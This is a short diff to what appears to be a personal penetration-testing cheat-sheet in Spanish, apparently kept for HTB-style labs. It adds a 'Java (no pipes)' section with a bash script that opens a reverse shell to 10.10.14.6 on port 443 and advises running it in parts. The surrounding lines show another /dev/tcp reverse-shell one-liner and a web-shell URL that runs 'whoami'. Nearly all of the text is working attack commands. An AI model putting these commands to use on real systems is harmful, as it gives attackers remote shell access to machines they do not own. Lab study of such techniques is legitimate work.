@@ -1096,6 +1096,18 @@ bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 http://10.129.228.122/upload/shell.asp?cmd=whoami
 
 ```
+## Java (no pipes)
+
+Java no deja usar pipes no le gusta entonces usa esto
+
+```
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.14.6/443 0>&1
+```
+
+Guarda el archivo y ejecutalo asi es como por partes
+
 
 ### Python Fully TTY
 
